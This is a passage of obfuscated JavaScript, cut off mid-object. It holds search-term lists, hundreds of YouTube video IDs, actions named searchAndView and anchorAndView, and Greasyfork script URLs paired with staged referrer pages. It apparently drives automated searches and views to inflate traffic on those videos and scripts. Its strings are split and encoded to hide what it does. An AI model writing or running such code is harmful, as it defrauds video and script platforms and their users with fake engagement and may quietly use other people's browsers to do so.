searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + Z(0x11) + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + a0(0x1e) + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + a1(0x13, '^x(c') + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x1ae9 + 0x2143 + 0x56 * -0xb3)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x19ef * 0x1 + -0x1 * 0x1886 + 0x327f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1da0 + 0x44e + 0x1955);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    a0(0x1d) + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + a1(0x18, '2e[E') + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + Z(0x8) + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + Z(0x1f) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + a1(0x7, 'Haqh') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + a0(0x20)
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + a0(0x5) + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
